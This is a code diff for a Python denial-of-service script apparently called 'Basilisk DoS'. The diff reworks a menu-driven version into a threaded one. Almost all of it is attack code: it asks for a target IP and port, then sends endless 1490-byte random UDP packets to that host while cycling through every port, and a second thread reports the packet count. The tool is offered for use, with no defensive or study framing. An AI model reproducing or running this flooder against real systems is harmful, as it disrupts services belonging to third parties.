@@ -1,5 +1,9 @@
-import os, random, time, sys, socket
+# requirements
+
+import os, random, time, sys, socket, threading
 from os import system, name
+
+# define colours
 
 cgreen = "\u001b[32m"
 cred = "\u001b[31m"
@@ -10,7 +14,7 @@ cmagenta = "\u001b[35m"
 cwhite = "\u001b[37m"
 creset = "\u001b[0m"
 
-ui = f"{cwhite}┌──({cred}basilisk㉿DoS{cwhite})\n└─{cred}$ "
+# clearing terminal at start
 
 def clear():
     if name == 'nt':
@@ -19,26 +23,10 @@ def clear():
     else:
         _ = system('clear')
 
-
-def BASILISK_DOS():
-    print(f"{cred}")
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    byte = os.urandom(1490)
-    print(f"{cwhite}Target IP: ")
-    IP = input(ui)
-    print(f"{cwhite}Target Port: ")
-    PORT = int(input(ui))
-    packets = 0
-    while True:
-        s.sendto(byte, (IP, PORT))
-        packets = packets + 1
-        PORT = PORT + 1
-        if PORT == 65535:
-            PORT = 1
-        print(f"{cred}[{cwhite}", packets, f"{cred}]", "Packets Sent from port", f"{cred}[{cwhite}", PORT, f"{cred}]")
-
-
 clear()
+
+# print banner
+
 print(f"""{cred}
 ███   ██      ▄▄▄▄▄   ▄█ █    ▄█    ▄▄▄▄▄   █  █▀     ██▄   ████▄    ▄▄▄▄▄   
 █  █  █ █    █     ▀▄ ██ █    ██   █     ▀▄ █▄█       █  █  █   █   █     ▀▄ 
@@ -46,21 +34,38 @@ print(f"""{cred}
 █  ▄▀ █  █  ▀▄▄▄▄▀    ▐█ ███▄ ▐█  ▀▄▄▄▄▀    █  █      █  █  ▀████  ▀▄▄▄▄▀    
 ███      █             ▐     ▀ ▐              █       ███▀                   
         █                                    ▀                               
-       ▀    {cwhite}
-┌──────────────────────────────┐
-│[{cred}1{cwhite}] Continuous Attack         │
-│[{cred}0{cwhite}] Exit.                     │
-└──────────────────────────────┘
-""")
+       ▀    """)
+# request destination ip and port
 
-s = input(ui)
+print(f"{cred}")
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+byte = os.urandom(1490)
+IP = input(f"\n{cwhite}┌──({cred}Target IP:{cwhite})\n└─{cred}$ ")
+PORT = int(input(f"\n{cwhite}┌──({cred}Target Port{cwhite})\n└─{cred}$ "))
+packets = 0
 
-if s == "1":
-    BASILISK_DOS()
+# dos function
 
-elif s == "0":
-    print(f"{creset}")
-    exit()
-elif s != "":
-    print("select valid option")
+def dos(IP, PORT):
+    print(f'\n{cred}Starting Dos...\n')
+    global packets
+    while True:
+        s.sendto(byte, (IP, PORT))
+        packets = packets + 1
+        PORT = PORT + 1
+        if PORT == 65535:
+            PORT = 1
+       
+# monitoring function
 
+def monitor():
+    while True:
+        time.sleep(1)
+        print(f'{cwhite}Total packets sent: [{cred}{packets}{cwhite}]')
+  
+
+# start threads
+
+threading.Thread(target=dos, args=(IP, PORT)).start()
+
+threading.Thread(target=monitor).start()
